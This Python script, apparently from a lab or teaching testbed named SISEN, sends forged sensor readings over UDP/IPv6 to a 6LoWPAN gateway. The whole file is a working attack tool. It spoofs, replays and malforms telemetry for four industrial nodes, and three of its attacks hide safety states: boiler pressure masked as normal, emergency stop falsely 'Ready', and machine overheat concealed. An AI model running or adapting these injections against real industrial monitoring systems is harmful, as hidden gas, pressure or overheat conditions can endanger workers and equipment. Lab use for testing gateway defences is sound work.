#!/usr/bin/env python3
import argparse
import json
import os
import random
import socket
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path

REFRESH_ATTACKS = {
    "spoof",
    "extreme",
    "malformed",
    "boiler-pressure-masked",
    "emergency-stop-hidden",
    "machine-overheat-hidden",
}
METADATA_FIELDS = {"sensor_id", "node_id", "label", "unit", "timestamp", "attack"}
TARGET_STATE_FILE = Path(
    os.environ.get(
        "SISEN_6LOWPAN_TARGET_STATE",
        str(Path(tempfile.gettempdir()) / "sisen-6lowpan-attack-targets.json"),
    )
)
ASSETS = {
    "node-01": {
        "label": "Boiler Room",
        "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
        "fields": {"temperature", "gas_leak", "pressure_status", "emergency_stop"},
    },
    "node-02": {
        "label": "Process Line",
        "sensor_id": "TEMP-LINE,HUM-LINE,OVERHEAT-LINE,ESTOP-LINE",
        "fields": {"temperature", "humidity", "machine_overheat", "emergency_stop"},
    },
    "node-03": {
        "label": "Cold Storage",
        "sensor_id": "TEMP-COLD,HUM-COLD,DOOR-COLD,AIR-COLD",
        "fields": {"temperature", "humidity", "occupancy", "air_quality"},
    },
    "node-04": {
        "label": "Loading Bay",
        "sensor_id": "TEMP-BAY,GAS-BAY,OCC-BAY,AIR-BAY",
        "fields": {"temperature", "gas_leak", "occupancy", "air_quality"},
    },
}
ELIGIBLE_TARGETS = {
    "spoof": ["node-01", "node-02", "node-03", "node-04"],
    "replay": ["node-01", "node-02", "node-03", "node-04"],
    "extreme": ["node-01", "node-02", "node-03", "node-04"],
    "missing": ["node-01", "node-02", "node-03", "node-04"],
    "malformed": ["node-01", "node-02", "node-03", "node-04"],
    "boiler-pressure-masked": ["node-01"],
    "emergency-stop-hidden": ["node-01", "node-02"],
    "machine-overheat-hidden": ["node-02"],
}


def utc_now():
    return datetime.now(timezone.utc).isoformat()


def reading_for(node_id, values, attack, timestamp=None, sensor_id=None):
    asset = ASSETS[node_id]
    unsupported = sorted(set(values) - asset["fields"])
    if unsupported:
        raise ValueError(f"{asset['label']} ({node_id}) does not support fields: {', '.join(unsupported)}")
    reading = {
        "sensor_id": sensor_id or asset["sensor_id"],
        "node_id": node_id,
        "label": asset["label"],
        "unit": "mixed",
        "timestamp": timestamp or utc_now(),
        "attack": attack,
    }
    reading.update(values)
    return reading


def target_payloads(args, profiles):
    node_ids = list(profiles)
    if args.target_node:
        if args.target_node not in profiles:
            available = ", ".join(node_ids)
            raise SystemExit(
                f"{args.attack} cannot target {args.target_node}. "
                f"Eligible targets: {available}"
            )
        node_id = args.target_node
    else:
        node_id = select_target(args.attack, node_ids)

    return [profiles[node_id]()]


def read_target_state():
    try:
        with TARGET_STATE_FILE.open("r", encoding="utf-8") as handle:
            state = json.load(handle)
    except (OSError, json.JSONDecodeError):
        return {}
    return state if isinstance(state, dict) else {}


def write_target_state(state):
    try:
        TARGET_STATE_FILE.parent.mkdir(parents=True, exist_ok=True)
        temporary = TARGET_STATE_FILE.with_suffix(".tmp")
        with temporary.open("w", encoding="utf-8") as handle:
            json.dump(state, handle, sort_keys=True)
        temporary.replace(TARGET_STATE_FILE)
    except OSError:
        pass


def shuffled_rotation(node_ids, previous):
    remaining = list(node_ids)
    random.shuffle(remaining)
    if previous in remaining and len(remaining) > 1 and remaining[0] == previous:
        remaining.append(remaining.pop(0))
    return remaining


def select_target(attack_name, node_ids):
    if len(node_ids) == 1:
        return node_ids[0]

    state = read_target_state()
    attack_state = state.get(attack_name, {})
    if not isinstance(attack_state, dict):
        attack_state = {}

    previous = attack_state.get("last")
    if previous not in node_ids:
        previous = None

    remaining = attack_state.get("remaining", [])
    if not isinstance(remaining, list):
        remaining = []
    remaining = [node_id for node_id in remaining if node_id in node_ids]

    if not remaining:
        remaining = shuffled_rotation(node_ids, previous)

    selected = remaining.pop(0)
    if selected == previous and remaining:
        remaining.append(selected)
        selected = remaining.pop(0)

    state[attack_name] = {"last": selected, "remaining": remaining}
    write_target_state(state)
    return selected


def spoof_payloads(args):
    return target_payloads(
        args,
        {
            "node-01": lambda: reading_for(
                "node-01",
                {
                    "temperature": 27.4,
                    "gas_leak": "Normal",
                    "pressure_status": "Normal",
                    "emergency_stop": "Ready",
                },
                "spoof",
            ),
            "node-02": lambda: reading_for(
                "node-02",
                {
                    "temperature": 31.8,
                    "humidity": 34.0,
                    "machine_overheat": "Normal",
                    "emergency_stop": "Ready",
                },
                "spoof",
            ),
            "node-03": lambda: reading_for(
                "node-03",
                {
                    "temperature": 9.4,
                    "humidity": 61.0,
                    "occupancy": "Occupied",
                    "air_quality": 760.0,
                },
                "spoof",
            ),
            "node-04": lambda: reading_for(
                "node-04",
                {
                    "temperature": 24.6,
                    "gas_leak": "Gas detected",
                    "occupancy": "Occupied",
                    "air_quality": 760.0,
                },
                "spoof",
            ),
        },
    )


def replay_payloads(args):
    stale_time = "2026-07-01T00:00:00+00:00"
    return target_payloads(
        args,
        {
            "node-01": lambda: reading_for(
                "node-01",
                {
                    "temperature": 24.4,
                    "gas_leak": "Normal",
                    "pressure_status": "Normal",
                    "emergency_stop": "Ready",
                },
                "replay",
                timestamp=stale_time,
            ),
            "node-02": lambda: reading_for(
                "node-02",
                {
                    "temperature": 29.6,
                    "humidity": 42.0,
                    "machine_overheat": "Normal",
                    "emergency_stop": "Ready",
                },
                "replay",
                timestamp=stale_time,
            ),
            "node-03": lambda: reading_for(
                "node-03",
                {
                    "temperature": 4.8,
                    "humidity": 58.0,
                    "occupancy": "Vacant",
                    "air_quality": 520.0,
                },
                "replay",
                timestamp=stale_time,
            ),
            "node-04": lambda: reading_for(
                "node-04",
                {
                    "temperature": 20.1,
                    "gas_leak": "Normal",
                    "occupancy": "Vacant",
                    "air_quality": 610.0,
                },
                "replay",
                timestamp=stale_time,
            ),
        },
    )


def extreme_payloads(args):
    return target_payloads(
        args,
        {
            "node-01": lambda: reading_for(
                "node-01",
                {
                    "temperature": 78.0,
                    "gas_leak": "Gas detected",
                    "pressure_status": "Pressure abnormal",
                    "emergency_stop": "Emergency stop active",
                },
                "false_extreme",
            ),
            "node-02": lambda: reading_for(
                "node-02",
                {
                    "temperature": 65.0,
                    "humidity": 18.0,
                    "machine_overheat": "Overheat detected",
                    "emergency_stop": "Emergency stop active",
                },
                "false_extreme",
            ),
            "node-03": lambda: reading_for(
                "node-03",
                {
                    "temperature": -12.0,
                    "humidity": 92.0,
                    "occupancy": "Occupied",
                    "air_quality": 1800.0,
                },
                "false_extreme",
            ),
            "node-04": lambda: reading_for(
                "node-04",
                {
                    "temperature": 67.5,
                    "gas_leak": "Gas detected",
                    "occupancy": "Occupied",
                    "air_quality": 2400.0,
                },
                "false_extreme",
            ),
        },
    )


def missing_payloads(args):
    return target_payloads(
        args,
        {
            "node-01": lambda: reading_for("node-01", {"temperature": 22.8}, "missing_telemetry"),
            "node-02": lambda: reading_for("node-02", {"humidity": 48.6}, "missing_telemetry"),
            "node-03": lambda: reading_for("node-03", {"occupancy": "Occupied"}, "missing_telemetry"),
            "node-04": lambda: reading_for("node-04", {"air_quality": 710.0}, "missing_telemetry"),
        },
    )


def malformed_payloads(args):
    return target_payloads(
        args,
        {
            "node-01": lambda: reading_for(
                "node-01",
                {"temperature": "not-a-temperature", "pressure_status": "???"},
                "malformed_protocol",
                sensor_id="PROTO-BAD-01",
            ),
            "node-02": lambda: reading_for(
                "node-02",
                {"humidity": "wet", "machine_overheat": "perhaps"},
                "malformed_protocol",
                sensor_id="PROTO-BAD-02",
            ),
            "node-03": lambda: reading_for(
                "node-03",
                {"temperature": "not-a-temperature", "air_quality": "opaque"},
                "malformed_protocol",
                sensor_id="PROTO-BAD-03",
            ),
            "node-04": lambda: reading_for(
                "node-04",
                {"gas_leak": "???", "air_quality": "dense"},
                "malformed_protocol",
                sensor_id="PROTO-BAD-04",
            ),
        },
    )


def boiler_pressure_masked_payloads(args):
    return target_payloads(
        args,
        {
            "node-01": lambda: reading_for(
                "node-01",
                {
                    "temperature": 78.4,
                    "gas_leak": "Normal",
                    "pressure_status": "Normal",
                    "emergency_stop": "Ready",
                },
                "boiler_pressure_masked",
            ),
        },
    )


def emergency_stop_hidden_payloads(args):
    return target_payloads(
        args,
        {
            "node-01": lambda: reading_for(
                "node-01",
                {"temperature": 74.9, "pressure_status": "Pressure abnormal", "emergency_stop": "Ready"},
                "emergency_stop_hidden",
            ),
            "node-02": lambda: reading_for(
                "node-02",
                {"temperature": 76.2, "machine_overheat": "Overheat detected", "emergency_stop": "Ready"},
                "emergency_stop_hidden",
            ),
        },
    )


def machine_overheat_hidden_payloads(args):
    return target_payloads(
        args,
        {
            "node-02": lambda: reading_for(
                "node-02",
                {"temperature": 86.3, "machine_overheat": "Normal", "emergency_stop": "Ready"},
                "machine_overheat_hidden",
            ),
        },
    )


ATTACKS = {
    "spoof": {
        "payloads": spoof_payloads,
        "impact": "A plausible but false reading can influence dashboard state if the gateway trusts node telemetry.",
    },
    "replay": {
        "payloads": replay_payloads,
        "impact": "A stale but valid reading can appear current when freshness is not checked.",
    },
    "extreme": {
        "payloads": extreme_payloads,
        "impact": "A syntactically valid extreme value can create a safety-relevant dashboard condition.",
    },
    "missing": {
        "payloads": missing_payloads,
        "impact": "The air-quality sensor is omitted, showing loss of visibility rather than a malformed packet.",
    },
    "malformed": {
        "payloads": malformed_payloads,
        "impact": "A syntactically valid message carries unexpected scalar values into the MQTT relay.",
    },
    "boiler-pressure-masked": {
        "payloads": boiler_pressure_masked_payloads,
        "impact": "Boiler Room pressure is reported normal while other process readings suggest a dangerous condition.",
    },
    "emergency-stop-hidden": {
        "payloads": emergency_stop_hidden_payloads,
        "impact": "Emergency stop status remains falsely ready during abnormal boiler pressure.",
    },
    "machine-overheat-hidden": {
        "payloads": machine_overheat_hidden_payloads,
        "impact": "Process Line overheat is hidden while temperature is unsafe.",
    },
}


def display_attack_name(attack_name):
    if attack_name == "spoof":
        return "spoofed"
    return attack_name


def attack_target(payloads):
    targets = []
    for reading in payloads:
        node_id = reading.get("node_id", "unknown-node")
        label = reading.get("label", reading.get("sensor_id", "unknown sensor"))
        target = f"{label} ({node_id})"
        if target not in targets:
            targets.append(target)
    return targets[0] if len(targets) == 1 else ", ".join(targets)


def eligible_targets_for(attack_name, payloads):
    node_ids = ELIGIBLE_TARGETS.get(attack_name, [reading["node_id"] for reading in payloads])
    return [f"{ASSETS[node_id]['label']} ({node_id})" for node_id in node_ids]


def changed_fields(reading):
    return sorted(set(reading) - METADATA_FIELDS)


def print_reading_summary(reading):
    node_id = reading.get("node_id", "unknown-node")
    label = reading.get("label", reading.get("sensor_id", "unknown sensor"))
    print(f"{label} ({node_id}):", flush=True)
    for field in changed_fields(reading):
        print(f"  {field} <- {reading[field]}", flush=True)


def send_payloads(sock, dest, port, payloads):
    for reading in payloads:
        payload = json.dumps(reading, separators=(",", ":")).encode("utf-8")
        sock.sendto(payload, (dest, port))
        print_reading_summary(reading)


def main():
    parser = argparse.ArgumentParser(description="Send controlled SISEN 6LoWPAN attack telemetry over UDP/IPv6.")
    parser.add_argument("--attack", required=True, choices=sorted(ATTACKS), help="Attack activity to run.")
    parser.add_argument("--source", default=None, help="Optional source IPv6 address to bind.")
    parser.add_argument("--dest", required=True, help="Destination IPv6 address.")
    parser.add_argument("--port", type=int, default=9999, help="Destination UDP port.")
    parser.add_argument("--interval", type=float, default=0.5, help="Seconds between payloads.")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to refresh applicable attacks.")
    parser.add_argument("--count", type=int, default=5, help="Repeat count for replay attacks.")
    parser.add_argument("--target-node", choices=sorted(ASSETS), help="Optional deterministic target override.")
    args = parser.parse_args()

    if args.interval <= 0:
        parser.error("--interval must be greater than zero")
    if args.duration < 0:
        parser.error("--duration must be zero or greater")
    if args.count < 1:
        parser.error("--count must be at least 1")

    attack = ATTACKS[args.attack]
    payloads = attack["payloads"](args)
    refresh_attack = args.attack in REFRESH_ATTACKS

    print(f"SISEN 6LoWPAN attack demo: {display_attack_name(args.attack)}", flush=True)
    print("Scenario: 6lowpan", flush=True)
    print(f"Target: {attack_target(payloads)}", flush=True)
    eligible_targets = eligible_targets_for(args.attack, payloads)
    if len(eligible_targets) == 1:
        print(f"Eligible targets: {eligible_targets[0]} only", flush=True)
    print(f"Purpose: {attack['impact']}", flush=True)
    print(flush=True)

    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    if args.source:
        sock.bind((args.source, 0))

    started = time.monotonic()
    publication = 0
    while True:
        publication += 1
        if publication > 1:
            print(flush=True)
            print(f"Refresh {publication}", flush=True)
        send_payloads(sock, args.dest, args.port, payloads)

        if args.attack == "replay":
            if publication >= args.count:
                break
        elif refresh_attack:
            if time.monotonic() - started >= args.duration:
                break
        else:
            break

        time.sleep(args.interval)

    print(flush=True)
    if refresh_attack:
        print(f"Attack completed after {args.duration:g} seconds.", flush=True)
    else:
        print(f"Attack completed after {publication} publication(s).", flush=True)
    print("Normal telemetry will now resume.", flush=True)


if __name__ == "__main__":
    main()
